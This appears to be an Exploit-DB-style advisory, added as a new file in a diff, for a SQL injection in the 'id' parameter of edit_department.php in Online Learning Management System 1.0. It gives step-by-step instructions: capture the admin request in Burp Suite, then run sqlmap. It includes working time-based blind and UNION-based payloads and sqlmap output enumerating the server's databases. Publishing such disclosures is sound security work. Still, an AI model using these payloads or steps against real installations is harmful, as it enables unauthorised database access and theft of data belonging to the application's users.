@@ -1,0 +1,55 @@
+# Exploit Title:  Online Learning Management System 1.0 - 'id' SQL Injection
+# Exploit Author: Aakash Madaan (Godsky)
+# Date: 2020-12-22
+# Vendor Homepage: https://www.sourcecodester.com/php/7339/learning-management-system.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=7339&title=Online+Learning+Management+System+using+PHP%2FMySQLi+with+Source+Code
+# Affected Version: Version 1
+# Category: Web Application
+# Tested on: Parrot OS
+
+Step 1. Login to the application with admin credentials
+
+Step 2. Click on "Departments" page.
+
+Step 3. Choose any event and select "edit". The url should be "http(s)://<host>/admin/edit_department.php?id=4"
+
+Step 4. Capture the request to the "edit" event page in burpsuite.
+
+Step 5. Save the captured request and run sqlmap on it using "sqlmap -r request --time-sec=5 --dbs
+
+---
+Parameter: id (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=4' AND (SELECT 7775 FROM (SELECT(SLEEP(5)))vwwE) AND
+'OoVY'='OoVY
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: id=-9296' UNION ALL SELECT
+NULL,NULL,CONCAT(0x716a707871,0x64766351487955536b5276427a5a416a764e6a4b46476a57704f6d73425368544153494e53525970,0x716a716a71)--
+-
+---
+[16:01:08] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[16:01:08] [INFO] fetching database names
+[16:01:12] [INFO] retrieved: 'information_schema'
+[16:01:13] [INFO] retrieved: 'mysql'
+[16:01:15] [INFO] retrieved: 'performance_schema'
+[16:01:16] [INFO] retrieved: 'css'
+[16:01:18] [INFO] retrieved: 'sales_inventory_db'
+[16:01:19] [INFO] retrieved: 'rios_db'
+[16:01:19] [INFO] retrieved: 'capstone'
+available databases [7]:
+
+[*] capstone
+[*] css
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] rios_db
+[*] sales_inventory_db
+
+
+Step 6. Sqlmap should inject the web-app successfully which leads to
+information disclosure
